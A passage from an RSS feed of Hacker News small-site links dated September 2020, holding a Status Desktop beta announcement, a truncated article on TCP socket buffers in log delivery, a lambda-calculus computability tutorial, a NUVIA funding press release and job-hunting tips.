DApp browser is currently removed from the product entirely while the team builds some final features and can then conduct a security audit. Access to DApps is a crucial part of the Status user experience, but only when strong privacy and security guarantees can be made. As always, Status will not cut corners and jeopardize the security of the community. Both the wallet and DApp browser are under active development and a security audit is in the near future. When the browser is enabled, Status will provide a window into the world of Web3 and a communication layer to Ethereum.</p><h3 id="device-syncing-and-importing-accounts">Device Syncing and Importing Accounts</h3><p>Current Status users can import their existing accounts and then easily sync their mobile and desktop apps for a seamless experience across devices. Simply import an account with a seed phrase and then head to the Profile Tab, Device settings, and then pair devices.</p><figure><iframe width="612" height="344" src="https://www.youtube.com/embed/J5K8dFJ3TCI?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></figure><p>Install Status Desktop and test it out for <a href="https://status.im/get/">Mac, Windows, or Linux</a>.</p><p><em>**Status Desktop is un-audited, beta software and builds are available for testing. For this reason, upon installation, you will need to drag Status into the applications folder on your desktop and then manually open the app: <strong>right click &gt;&gt; Open</strong></em></p><p><em>Current status of builds:</em></p><!--kg-card-begin: markdown--><ul>
<li>macOS build is signed but not notarized</li>
<li>Windows build is not signed</li>
<li>Linux build is not signed</li>
</ul>
<!--kg-card-end: markdown--><h3 id="features-">Features:</h3><p><u>Account creation:</u></p><ul><li>Import existing accounts</li><li>Device syncing across desktop and mobile devices</li><li>Three word names for pseudonymity</li><li>Local contact names</li></ul><p><u>Messenger:</u></p><ul><li>Waku protocol for p2p messaging</li><li>Private 1:1, Private Group, and Public chats</li><li>Purchasing and sending stickers</li><li>Payments in chat</li><li>Images in 1:1 and group chats</li><li>Stateofus.eth ENS registration + usernames will display and sync across devices</li><li>Emoji reactions</li><li>@ mentions</li><li>Receiving audio messages (not sending yet)</li><li>Notifications</li><li>Offline support</li><li>Supports markdown formatting</li><li>Image unfurling (needs to be activated for privacy)</li></ul><p><u>Wallet:</u></p><ul><li>Hidden from UI by default (must be enabled - Profile &gt;&gt; Advanced &gt;&gt; Wallet Tab)</li><li>Send and receive ERC20 and ERC721 tokens</li><li>Creation of multiple wallet accounts</li><li>Add/remove tokens from list</li></ul><p><u>Web3 Dapp Browser</u></p><ul><li>Unavailable </li></ul><p><u>Miscellaneous</u></p><ul><li>Dark Mode</li><li>Compact mode</li><li>Supports 4k resolution</li></ul><p><u>Available on:</u></p><ul><li>Mac</li><li>Linux</li><li>Windows</li></ul><p>Install Status Desktop and test it out for <a href="https://status.im/get/">Mac, Windows, or Linux</a>.<br></p>
                            
                        </div>
                    </div>
                </div>
            </div>
        </div></div>]]>
            </description>
            <link>https://our.status.im/re-introducing-status-desktop-beta-v0-1-0/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24578847</guid>
            <pubDate>Thu, 24 Sep 2020 14:21:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why your application should not be responsible for delivering logs]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24578707">thread link</a>) | @jerodsanto
<br/>
September 24, 2020 | https://dev.sweatco.in/centralized-logging-delivery/ | <a href="https://web.archive.org/web/*/https://dev.sweatco.in/centralized-logging-delivery/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
				<p><a href="https://dev.sweatco.in/centralized-logging-solution/">In a previous article</a>, we looked at the overall architecture of our logging system and how it has evolved. In this article we will look at the frequent problems that we have to deal with when interacting with processes on different instances, which we also have to deal with in the process of constructing an ideal logging system. But we will also cover the main topic of our article - <strong>why your application should not be responsible for delivering logs</strong>. </p><p>When transferring data from one host to another host or a program on one instance to a program on another instance, we face with the concept of interprocess communication (<strong>IPC</strong>) in Linux.</p><h2 id="tcp-or-stream-sockets-in-action">TCP or stream-sockets in action</h2><p>In order for one program to transmit a message to another program, an abstraction in the form of <strong><em>ports</em></strong> was invented. Knowing the TCP address of the computer, we know where to send, and knowing the port to which we can send messages, assuming that the program "owning" this port can pick up this data from there. Thus, we abstract from specific program identifiers.</p><p>Another useful abstraction in linux that makes life easier for a programmer is a <strong>file</strong>. A <em>device</em>, a <em>file on a disk</em> or a <em>network</em> - you will always work with the <code>file</code> abstraction. In case of network interaction, you will work with <em><strong>sockets</strong></em> - special "files" intended for exchanging messages on the network.</p><p>There are two types of sockets: <em><strong>stream-socket</strong></em> and <strong><em>datagram-socket</em></strong>.</p><!--kg-card-begin: markdown--><ul>
<li><em>Stream-socket</em> can be represented as <strong>an entry / exit point</strong> of an endless river of bytes (note that the byte sequence, otherwise it will not be a stream).</li>
<li><em>Datagram-socket</em> can be thought of as your personal <strong>mailbox</strong>, which is ready to receive letters or telegrams (a sequential and limited set of bytes), but the number of such messages cannot exceed the size of your mailbox.</li>
</ul>
<!--kg-card-end: markdown--><p>The guarantees that follow from the definition of <em>stream-socket</em> can be provided both at the <em><strong>local level</strong></em> (UNIX domain) and at the <em><strong>network level</strong></em> (IPv4 or IPv6 domain). <em>At the network level</em>, such guarantees are implemented by the TCP or <strong>Transmission Control Protocol</strong>. I would like to focus on the fact that the type of socket is more important here, and not the domain (UNIX or IPv4/IPv6) in which it works.</p><blockquote>A protocol is a standard that describes the format and interaction of data transfer. For example, sending ordinary letters via post office can also be called a transfer protocol - on such letters we need to indicate the sender and recipient in a certain format, and also pay for the sending, etc.</blockquote><p>Having created the <em>stream socket</em> (linux api function <em><strong>socket</strong></em>) and <em>port</em>, we need to somehow "connect" them (linux api function <em><strong>bind</strong></em>), and then we are ready to start receiving messages from the clients that transmit them (linux api function <em><strong>listen</strong></em>).</p><figure><img src="https://dev.sweatco.in/content/images/2020/07/Logging-part1.svg" alt=""></figure><p><em><strong>The Linux API function</strong> is an available C language function that allows you to "officially" perform actions in user space linux using the Linux kernel system resources and services. Interpreted languages such as python and ruby can wrap C language functions in their own libraries and classes, providing greater convenience and development speed with such functions.</em></p><p>After this stage, the <strong>client</strong> can also create a stream socket (linux api function <strong><em>socket</em></strong>) and then connect (linux api function <em><strong>connect</strong></em>).</p><figure><img src="https://dev.sweatco.in/content/images/2020/06/Logging-part2.svg" alt=""></figure><blockquote>Usually, at this point, illustrations or explanations of how the 3-way handshake and further details of establishing a connection between programs begin to appear. But, as a rule, such details become relevant when there are any errors in establishing a connection or in the process of information transfer between the clients.</blockquote><p>After the connection is established, we can start sending messages. But here, our next question awaits - what to do if the message is lost and who guarantees its' delivery? If linux guarantees delivery of a message after it is received from the application, then it needs a <strong>buffer</strong> for the delivery time, in case linux needs to send them again in case of loss. The same is true in the opposite case, when a part of a message comes and the receiving application has not yet managed to process it. Thus, <strong>we need a buffer</strong> for <em>receiving</em> and <em>sending</em> both on the sending side and on the receiving side.</p><figure><img src="https://dev.sweatco.in/content/images/2020/07/Logging-TCP.svg" alt=""></figure><p>In the figure, we see that each client socket creates a buffer for receiving and sending at the Linux level. But a curious developer immediately has a lot of questions:</p><!--kg-card-begin: markdown--><ul>
<li>what is the size of the socket buffer</li>
<li>what happens when the buffer size is exceeded
<ul>
<li>server side</li>
<li>client side</li>
</ul>
</li>
<li>Is the buffer on the listening socket shared, or is it as separate as on the clients?</li>
<li>whether it is necessary to increase the size of such buffers and how large they should be made</li>
</ul>
<!--kg-card-end: markdown--><p>We will conduct an empirical experiment on ruby (yes, best language in the world) and try to find the answers.</p><!--kg-card-begin: html--><a href="https://asciinema.org/a/z4iODpZMeSV1k5S4PGFGRTS5S" target="_blank"><img src="https://asciinema.org/a/z4iODpZMeSV1k5S4PGFGRTS5S.svg"></a><!--kg-card-end: html--><p>In the lower left corner we can see Socket Stat ( <code>ss</code>) for all stream sockets that are connected to port <code>19_019</code> (note also that netstat is showing at the same time). What we can find out when viewing this window:</p><!--kg-card-begin: markdown--><ol>
<li>LISTEN socket <code>*: 19_019</code> in the Send-Q column shows the size of the backlog (the max number of connections waiting to be <strong>accepted</strong> - as we can see from the Recv-Q column, it can accept <code>backlog + 1</code> the number of waiting ESTABLISHED connections). Once again, I want to note that <strong>the connection has already been established</strong> (!) - the client can send messages there (imagine that you were allowed to queue to make an order, but you have not yet made payment)</li>
<li>After connecting the client to the server, we see two ESTABLISHED sockets - the server <code>127.0.0.1:19019 -&gt; 127.0.0.1: 37242</code> and the client <code>127.0.0.1:37242 -&gt; 127.0.0.1: 19019</code> (we are the server and client create on one instance).</li>
<li>The client and server socket have their own Recv and Send buffers</li>
<li>When the Recv buffer overflows on the server, the client buffer holds the rest of the data in the local Send buffer.</li>
</ol>
<!--kg-card-end: markdown--><blockquote>And another important point that I want to focus on is that the data in the buffer belongs to the operating system, and not to our process (!), which means that we will not see memory consumption at the process level until we start taking data from there.</blockquote><p>Let's see what happens to the client when it tries to connect when the queue of connections waiting to be accepted is full</p><!--kg-card-begin: html--><a href="https://asciinema.org/a/jtoePFOPVbyMT3oWK87RWCMQg" target="_blank"><img src="https://asciinema.org/a/jtoePFOPVbyMT3oWK87RWCMQg.svg"></a><!--kg-card-end: html--><p>As we can see, it is blocked and the connection is in the SYN-SENT state (our client application does not know this). After accepting the first socket, we get the first messages from the buffer (!)</p><p>It is important that <code>socket1</code> for a very long time ‚Äúthinks‚Äù that the data <em>has been sent</em>, <strong>although</strong> practically all this time they were in the linux buffer both on the server and on the client (!).</p><p>Is it true that the buffer is <code>981_788</code> bytes? Let's send the message again and see, after picking up the message that is still in the buffer.</p><!--kg-card-begin: html--><a href="https://asciinema.org/a/tx1FI1aZh9DOnldNyqqmvZOxS" target="_blank"><img src="https://asciinema.org/a/tx1FI1aZh9DOnldNyqqmvZOxS.svg"></a><!--kg-card-end: html--><p>After further experiments, we see that the buffer size increased and reached a size of <code>5_901_199</code> bytes. More than <strong>5 MB</strong> is in the linux buffer, which are waiting for their turn to be processed by the application. And if there will be <code>1_000</code> of such connections?</p><p>You can also make sure that if the buffer is empty, the connection is blocked until messages appear in it (here golang developers can recall <code>go-channels</code> - a very similar behavior).</p><p>Thus, we see the following default behavior of tcp in modern linux:</p><!--kg-card-begin: markdown--><ol>
<li>the buffer size automatically increases to a certain limit from the initial level</li>
<li>there is a limit on the number of pending connections</li>
<li>after the buffer is full (no matter how big it is), the sender is blocked, which means that sender don't have an ability to send messages to the server</li>
</ol>
<!--kg-card-end: markdown--><h2 id="tcp-in-logging">TCP in logging</h2><p>This TCP behavior raises server connectivity issues.</p><!--kg-card-begin: markdown--><ul>
<li>How to handle when the clients cannot connect and send logs<br>
If a client ‚Äúreceives‚Äù connection error (as in scenario above), then another chain of questions arises:
<ul>
<li>How long for should a client try to reconnect?</li>
<li>What should a client do if it cannot connect?
<ul>
<li>Do not send logs or</li>
<li>Do not launch / crash the application?</li>
</ul>
</li>
</ul>
</li>
<li>How do we know that our logs are not sent if we do not send them?</li>
</ul>
<!--kg-card-end: markdown--><p>A lot of questions. And all of this led me to an analogy from everyday life that describes the behavior of TCP in this extreme situation.</p><p>Imagine that your car is an analogue of a client socket and you plan to visit your favorite drive thru restaurant. As soon as you left the roadway, you established a connection (established connection, 3-way handshake successful) and got into the backlog queue. When your turn to place an order comes (<em>connection accepted</em>), you begin to exchange messages with the staff ‚Äì your order, your order changes, payment ‚Äì and with their managers if something goes wrong.</p><p>Usually everything is fine, as long as the restaurant copes with the flow of requests, but if the waiting queue is full (backlog queue), then all other connections are built in anticipation of the opportunity to get into the restaurant queue (all cars are on the roadway waiting for the opportunity to drive in).</p><p>If the waiting time in the roadway queue is exceeded and the connection cannot be established, the balancer (in our analogy, this may be the traffic controller at the intersection) can change the route for sending requests to another server (in our analogy, the restaurant).</p><blockquote>As we discussed in the previous article, you can increase the availability of logging by introducing a balancer that can redirect connections to the instance that is less loaded with connections, but then you need at least two such instances, and if you do not have idle hardware waiting, then this triggers additional costs.</blockquote><figure><img src="https://dev.sweatco.in/content/images/2020/05/Logging-Accept-1.png" alt=""><figcaption><a href="https://www.newstalkzb.co.nz/news/national/queue-at-auckland-mcdonalds-store-cause-traffic-jams/">Queue at Auckland McDonalds store cause traffic jams</a></figcaption></figure><p>If you still managed to connect, then as we saw earlier, the client does not know whether the server started processing it or not. What happens when the size of the system socket buffer is exhausted? (you can imagine that all the passengers of the car begin to tell the driver what they want to order). What to do with messages that are waiting to be sent? Create a buffer for sending within the application? How big do it? What to do when it ends? flood?</p><p>In the worst case, your application ‚Ä¶</p></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://dev.sweatco.in/centralized-logging-delivery/">https://dev.sweatco.in/centralized-logging-delivery/</a></em></p>]]>
            </description>
            <link>https://dev.sweatco.in/centralized-logging-delivery/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24578707</guid>
            <pubDate>Thu, 24 Sep 2020 14:06:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Limits of Computability]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24578658">thread link</a>) | @helmut_brandl
<br/>
September 24, 2020 | https://hbr.github.io/Lambda-Calculus/computability/text.html | <a href="https://web.archive.org/web/*/https://hbr.github.io/Lambda-Calculus/computability/text.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">

<nav id="TOC" role="doc-toc">
<ul>
<li><a href="#introduction">Introduction</a>
<ul>
<li><a href="#background">Background</a></li>
<li><a href="#barberville">Barberville</a></li>
</ul></li>
<li><a href="#lambda-calculus-basics">Lambda Calculus Basics</a>
<ul>
<li><a href="#lambda-terms">Lambda terms</a></li>
<li><a href="#reduction">Reduction</a></li>
<li><a href="#notation">Notation</a></li>
<li><a href="#booleans">Booleans</a></li>
<li><a href="#pairs">Pairs</a></li>
<li><a href="#church-numerals-and-arithmetics">Church Numerals and Arithmetics</a></li>
</ul></li>
<li><a href="#encoding-of-lambda-terms">Encoding of Lambda Terms</a>
<ul>
<li><a href="#required-functions-for-encoding">Required Functions for Encoding</a></li>
<li><a href="#self-reference">Self Reference</a></li>
<li><a href="#godelchurch-numbering">Godel/Church Numbering</a></li>
</ul></li>
<li><a href="#undecidability">Undecidability</a>
<ul>
<li><a href="#basic-undecidability">Basic Undecidability</a></li>
<li><a href="#undecidability-of-beta-equivalence">Undecidability of Beta Equivalence</a></li>
<li><a href="#undecidability-of-the-halting-problem">Undecidability of the Halting Problem</a></li>
</ul></li>
</ul>
</nav>

<!-- Global site tag (gtag.js) - Google Analytics -->


<p><strong><a href="https://hbr.github.io/Lambda-Calculus/computability/index.html">Up</a></strong></p>

<h2 id="background">Background</h2>
<p>We explore the limits of computability, i.e.&nbsp;the question: <em>Are there functions which cannot be computed?</em></p>
<p>At the turn of the 19th/20th century there was a great optimism regarding this question. Most of the mathematicians thought that every mathematical function must be computable, every mathematical question has to be decidable.</p>
<p>The famous german mathematician David Hilbert formulated a program (today called <em>Hilbert‚Äôs program</em>) to ground all mathematics on axioms and formal proofs and prove that such a system is free of inconsistencies. In such a formal system it should be possible to prove or disprove all mathematical statements. He expressed his belief with his famous sentence</p>
<blockquote>
<p><em>We must know, we will know</em>.</p>
</blockquote>
<p>This optimism had not been restricted to mathematics. It had been present in all science and technology. The Eiffel tower has been build for the world exposition in 1889. A 324 m high steel building representing the power of technology. Albert Einstein published 1905 his theory of relativity and in 1915 his theory of general relativity. Both theories had been verified by various experiments. The Wright brothers invented and flew the first airplane in 1903.</p>
<p>But let‚Äôs go back to mathematics. In 1901 Bertrand Russel discovered a paradox in naive set theory. It has been customary to talk about the set of all sets. Bertrand Russel found out that this leads to the paradoxical</p>
<blockquote>
<p><em>set of all sets which do not contain themself.</em></p>
</blockquote>
<p>Does this unversal set contain itself? If yes, it contains itself and therefore cannot be in the set. If no, it does not contain itself and therefore must contain itself.</p>
<p>In order to avoid such paradoxes which lead to contradictions, Whitehead and Russel published in 1910, 1912 and 1913 the famous <em>Principia Mathematica</em> which provided a foundation for mathematics free of paradoxes.</p>
<p>The young viennese mathematician Kurt Goedel invented a technique called <em>Goedel Numbering</em>. He used this technique to formulate a sentence similar to Russel‚Äôs paradox as a mathematical statement about natural numbers. Such a statement can be expressed in the formalism of Principia Mathematica and therefore can be injected into Principia Mathematica like a Trojan horse. In his famous incompleteness theorem (1931) Goedel demonstrated that paradoxical statements can be injected into all formalisms which are powerful enough to express basic arithmetics.</p>
<p>Imagine the blow to Hilbert‚Äôs program! All formal theories sufficiently powerful are either inconsistent or incomplete.</p>
<p>The positive side of Goedels incompleteness theorem: Paradoxes are not necessarily bad. They are part of the mathematicians toolkit to prove something.</p>
<p>In 1936 Alan Turing and Alonzo Church proved independently that there are undecidable (or uncomputable) problems in mathematics. They basically used the technique of Goedel numbering in their proofs.</p>
<p>In this paper we are going to show that there are functions which cannot be computed in lambda calculus. Note that functions can return a boolean value and a not computable boolean valued function represents an undecidable predicate.</p>
<p>We don‚Äôt use a lot of math here. We continue to express the ideas in programmer‚Äôs terms like we did in <a href="https://hbr.github.io/Lambda-Calculus/lambda2/lambda.html">Programming with Lambda Calculus</a>. Everybody who is able to program functions should be able to follow.</p>
<h2 id="barberville">Barberville</h2>
<p>Nearly all proofs of undecidability use the encoding of some logical paradox. Let‚Äôs review the outline of such proofs using the example of the <em>barber paradox</em>.</p>
<p>Definition:</p>
<blockquote>
<p>A village has the <em>barber</em> property if there is a barber in the village who shaves all the men in the village who do not shave themselves.</p>
</blockquote>
<p>Theorem:</p>
<blockquote>
<p>A village with the barber property does not exist.</p>
</blockquote>
<p>Proof:</p>
<p>Let‚Äôs assume by way of contradiction that such a village exists. Then there is a barber who shaves every man in the village who does not shave himself.</p>
<p>Now there are two possibilities:</p>
<ol type="1">
<li><p>The barber shaves himself: This is not possible because the barber can only shave men who do not shave themselves. Therefore the assumption that the barber shaves himself leads to a contradiction.</p></li>
<li><p>The barber does not shave himself: This is not possible because the barber shaves all the men who do not shave themselves. Therefore the assumption that the barber does not shave himself leads to a contradiction as well.</p></li>
</ol>
<p>The assumption that such a village exists leads to a contradicion. Therefore we have to conclude that a village with the barber property cannot exist.</p>
<p>Note that some kind of self reference is essential in all paradoxes. In order to use this technique to show that some predicates are undecidable in lambda calculus we have to introduce some self referential lambda terms. I.e. we need some lambda terms and encoded versions of them.</p>
<p>In order to do this, we need some techniques. After having the machinery the actual proof is not complicated.</p>

<p>This section summarizes some basic knowledge of lambda calculus which is required to understand the rest of the text.</p>
<p>If the summary is too compressed, then read the text <a href="https://hbr.github.io/Lambda-Calculus/lambda2/lambda.html">Programming with Lambda Calculus</a> which gives more detailed introduction.</p>
<h2 id="lambda-terms">Lambda terms</h2>
<p>A lambda term is either a variable, an application of a function term to a variable term or a lambda abstraction.</p>
<div id="cb1"><pre><code><span id="cb1-1">    t   <span>::=</span>     x           <span>-- variable</span></span>
<span id="cb1-2">        <span>|</span>       (a b)       <span>-- application of 'a' to the argument 'b'</span></span>
<span id="cb1-3">        <span>|</span>       (\ x <span>:=</span> a)  <span>-- abstraction</span></span>
<span id="cb1-4">                   <span>^</span>    <span>^</span> definition term</span>
<span id="cb1-5">                   <span>|</span> bound variable</span></code></pre></div>
<p>where <code>x</code> ranges over an infinite supply <code>x0, x1, x2, ...</code> of variables and <code>a, b, t</code> range over arbitrary lambda terms.</p>
<p>In mathematical texts the abstraction <code>(\x := a)</code> is usually written as <img src="https://latex.codecogs.com/png.latex?%5Ctextstyle%20%5Clambda%20x.%20a" alt="\lambda x. a" title="\lambda x. a">. In this text we prefer an ascii notation in order to be able to write lambda terms more like terms in a functional programming language. However the mathematical notation and the ascii notation denote the same thing.</p>
<p>The name of a bound variable is irrelevant. The names of bound variables can be changed consistently as long as the change does not interfere with variables which are not bound by the same binder. This restriction is necessary, because a renaming must not make a free variable bound.</p>
<p>Bound variable names in lambda calculus have the same character as formal argument names in programming languages.</p>
<p>All functions in lambda calculus have only one argument. This is not a restriction, because the function applied to an argument can return another function which can be applied another argument.</p>
<h2 id="reduction">Reduction</h2>
<p>The lambda term <code>(\ x := exp) a</code> is a reducible expression. The basic reduction step is</p>
<pre><code>    (\ x := exp) a      ~&gt;      exp[x := a]
                        ^
                        read "reduces to"</code></pre>
<p>where <code>exp[x:=a]</code> is the term <code>exp</code> where all free variables in <code>exp</code> have been replaced by the term <code>a</code>. Note that it might be necessary to rename bound variables in <code>exp</code> before doing the substution in such a way that they do not interfere with any free variables in <code>a</code>. This is always possible since we have an infinite supply of variables.</p>
<p>Example:</p>
<pre><code>    ((\ x := (\ y := x)) a) b
    ~&gt; (\ y := x)[x:=a] b
    =  (\ y := a) b
    ~&gt; a[y:=b]
    =  a</code></pre>
<p>Note that the last equality is valid. <code>a</code> must not contain the free variable <code>y</code>. Otherwise we would have been obliged to rename <code>y</code> to a new variable which is not contained in <code>a</code>.</p>
<h2 id="notation">Notation</h2>
<p>In order to avoid excessive brackets we use some conventions.</p>
<ol type="1">
<li><p>Outer brackets can be ommitted.</p></li>
<li><p>Function application associates to the left. I.e. <code>((a b) c) d)</code> can be written as <code>a b c d</code>.</p></li>
<li><p>Functions with more than one argument can be written in a compressed form. I.e. instead of writing <code>\ x := (\y := exp)</code> we can write <code>\ x y := exp</code>.</p></li>
</ol>
<h2 id="booleans">Booleans</h2>
<p>Data types in lambda calculus are represented by functions which <em>do something</em> which is meaningful for the data type.</p>
<p>A boolean term has two values, true and false. We can encode such values in lambda calculus as functions taking two arguments and returning either the first in case of a true value and the second in case of a false value.</p>
<pre><code>    true  := (\ x y := x)
    false := (\ x y := y)</code></pre>
<p>Therefore <code>true a b ~&gt; a</code> and <code>false a b ~&gt; b</code>.</p>
<p>Note that we use the reduction symbol <code>~&gt;</code> in a sloppy manner. <code>t ~&gt; u</code> can mean that <code>t</code> reduces to <code>u</code> in one step or in more steps. In this paper there is no need to distinguish between one step and multistep reduction. In other contexts it might be necessary to use different symbols.</p>
<p>In order to make our notation look more like definitions in a programming language we can write the definitions of <code>true</code> and <code>false</code> as</p>
<pre><code>    true  x y := x
    false y y := y</code></pre>
<p>But remember that definitions are just abbreviations to make the terms more readable. Lambda calculus does not know of any definitions. The corresponding lambda term can always be obtained by expanding the definitions. This is always possible, because no recursive definitions are allowed. Definitions are just abbreviations.</p>
<h2 id="pairs">Pairs</h2>
<p>We can use our notation to define pairs in lambda calculus.</p>
<pre><code>    pair x y f := f x y</code></pre>
<p>If we apply <code>pair</code> only to two arguments <code>pair a b</code> we get a function which expects another argument and then applies the missing argument to the first two arguments. This fact can be used to define the following projections</p>
<pre><code>    first p     :=  p (\ x y := x)
    second p    :=  p (\ x y := y)</code></pre>
<p>The following reduction shows that <code>first</code> behaves as expected extracting the first part of a pair.</p>
<pre><code>    first (pair a b)
    =  first ((\ x y f := f x y) a b)
    ~&gt; first (\ f := f a b)
    =  (\ f := f a b) (\x y := x)
    ~&gt; (f a b)[f:= (\x y := x)]
    =  (\x y := x) a b
    ~&gt; (\ y := x)[x:=a] b
    =  (\ y := a) b
    ~&gt; a[y:=b]
    =  a</code></pre>
<p>Note again that <code>a</code> must not contain <code>y</code>. Otherwise the variable <code>y</code> must be renamed to another variable which ‚Ä¶</p></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://hbr.github.io/Lambda-Calculus/computability/text.html">https://hbr.github.io/Lambda-Calculus/computability/text.html</a></em></p>]]>
            </description>
            <link>https://hbr.github.io/Lambda-Calculus/computability/text.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24578658</guid>
            <pubDate>Thu, 24 Sep 2020 14:00:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Nuvia Raises $240M Series B Funding]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24578646">thread link</a>) | @jamieiles
<br/>
September 24, 2020 | https://nuviainc.com/news/nuvia-raises-240m-series-in-b-funding | <a href="https://web.archive.org/web/*/https://nuviainc.com/news/nuvia-raises-240m-series-in-b-funding">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div data-layout-label="Post Body" data-type="item" id="item-5f694760bdf79a7585354fb9"><div><div><div data-block-type="2" id="block-415dc546387c027f9e9c"><div><h3><strong>Series B Investment Round to Provide Runway to First Silicon for Orion SoC</strong> </h3><p><strong>Santa Clara, Calif., September 24, 2020</strong> - NUVIA, a leading-edge silicon design company, today announced the close of its Series B funding round, raising $240M.&nbsp; The funding round was led by Mithril Capital in partnership with Sehat Sutardja and Weili Dai (founders of Marvell Technology Group), funds and accounts managed by BlackRock, Fidelity Management &amp; Research Company LLC., and Temasek, with additional participation from Atlantic Bridge, Redline Capital, Capricorn Investment Group, Dell Technologies Capital, Mayfield, Nepenthe LLC and WRVI Capital. The closure of NUVIA‚Äôs Series B round builds on a $53M Series A round, raised in November 2019. NUVIA was founded in February 2019 by John Bruno, Manu Gulati and Gerard Williams, with the vision to create the world‚Äôs leading server processor.</p><p>‚ÄúThe opportunity in front of NUVIA has never been brighter, with an industry that‚Äôs looking for a new way to get the performance needed to power the next generation of cloud and enterprise computing,‚Äù said Gerard Williams III, CEO, NUVIA. ‚ÄúWe‚Äôre very fortunate to have an incredible group of investors behind us as we close Series B and take the next steps in our vision to redefine performance, energy efficiency, scalability, compute density and total cost of ownership within the data center.‚Äù</p><p>NUVIA is building a leading-edge SoC and CPU core, codenamed ‚ÄúOrion‚Äù and ‚ÄúPhoenix,‚Äù that are designed to deliver industry leading performance on real cloud workloads. More details on performance for the Phoenix CPU can be found at <a href="https://nuviainc.com/blog/performancedeliveredanewway"><span>https://nuviainc.com/blog/performancedeliveredanewway</span></a>.</p><p><strong>About NUVIA</strong></p><p>Headquartered in Santa Clara, NUVIA was founded on the promise of reimagining silicon design for high-performance computing environments. The company is focused on building products that blend the best attributes of compute performance, power efficiency and scalability. For more information, please visit<a href="https://www.nuviainc.com/"><span> </span></a><a href="http://www.nuviainc.com/"><span>www.nuviainc.com</span></a>.</p></div></div></div></div></div></div></div>]]>
            </description>
            <link>https://nuviainc.com/news/nuvia-raises-240m-series-in-b-funding</link>
            <guid isPermaLink="false">hacker-news-small-sites-24578646</guid>
            <pubDate>Thu, 24 Sep 2020 13:59:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What I Wish I Knew Before Searching for a PM Job]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24578559">thread link</a>) | @ricotico060
<br/>
September 24, 2020 | https://jackantico.com/What-I-Wish-I-Knew-Before-I-Started-Job-Hunting/ | <a href="https://web.archive.org/web/*/https://jackantico.com/What-I-Wish-I-Knew-Before-I-Started-Job-Hunting/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>With the job hunting season well under way, I thought I would give a list of tips, tricks, and guiding principles I‚Äôve learned from hunting both this season and seasons past. Most of this advice centers around finding a Product or SWE job, but I‚Äôm sure some of it applies to other industries as well.</p>

<p><strong>Have a separate gmail account for applying to jobs.</strong> One of the most annoying things about being on the job hunt is the constant emails from companies. When you can be applying for up to 200+ jobs with tech companies, do yourself a favor and set up a separate account which you only check a few times a week. Seeing rejection email after rejection email come into the account you normally check can really put a strain on your mental health. Also, only have this account signed in on your computer, not your phone.</p>

<p><strong>You‚Äôre going to get rejected 95% of the time; apply to as many jobs as possible.</strong> I remember when I was searching for my first real internship; I applied to about 20 jobs in the first week and got rejected by all of them. During the college process, I applied to about 20 colleges as well and got into about half of them. At first, I felt incredibly hopeless after not getting moving on with a single company. After reading more about the process, however, I realized that this rejection rate was normal so I kept my head down and ended up getting an internship with a company really liked. Related to this note, I remember getting advice from the Career Center to really focus on just a few roles. Ignore that: apply to as many jobs as possible.</p>

<p><strong>Take a break from job boards every couple of weeks.</strong> It‚Äôs tempting to go with the strategy of ‚ÄúI‚Äôm going to apply to 5, 10, X amount of jobs every day‚Äù to boost your numbers. This can work for a period of time, but jobs boards really only refresh about once a month. What ends up happening (at least what happened with me) is I started applying to companies I really didn‚Äôt fit at just to hit my daily goal which led to me feeling burnt out. If you start seeing the early signs of burnout in yourself, I‚Äôd encourage you to take two or three weeks off and just don‚Äôt think about the job search.</p>

<p><strong>Keep an excel spreadsheet of jobs you have applied for.</strong> I can‚Äôt stress this one enough: keep a simple google sheet or excel spreadsheet of the companies you applied for and your current application status with them. It can help you visualize how your search is going and also makes sure you don‚Äôt apply to the same job as well. Additionally, say you find a company you really like when you‚Äôre searching for an internship. You can check out the one I made for my summer 2020 internship search <a href="https://docs.google.com/spreadsheets/d/1cJ5QLdFAmchnR231uSC5fxJifgo6HtrMniIahcDk4I4/edit?usp=sharing">here</a>.</p>

<p><strong>Download Clipboard History Pro to have all of your links handy.</strong> Most jobs apps require various links: a link to your Linkedin, Github, Portfolio, Twitter, and/or personal website. I used to just keep all these tabs open in my browser while I applied to jobs until I heard about clipboard extensions which remember the last 100 things you‚Äôve copied and pasted. I use Clipboard History Pro (no relation)</p>

<p><strong>Only do cover letters for jobs you really want.</strong> Take this tip with a grain of salt. I usually tell people to never do cover letters and have refused to do them myself in the past. Now, I can see why they might be useful at smaller companies where there are less applicants as there is a greater chance they actually get read. I would say only write a cover letter for companies with less than 200 employees.</p>

  </div></div>]]>
            </description>
            <link>https://jackantico.com/What-I-Wish-I-Knew-Before-I-Started-Job-Hunting/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24578559</guid>
            <pubDate>Thu, 24 Sep 2020 13:47:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How Iranian diaspora is using old-school tech to fight internet shutdown at home]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24578551">thread link</a>) | @leoschwartz
<br/>
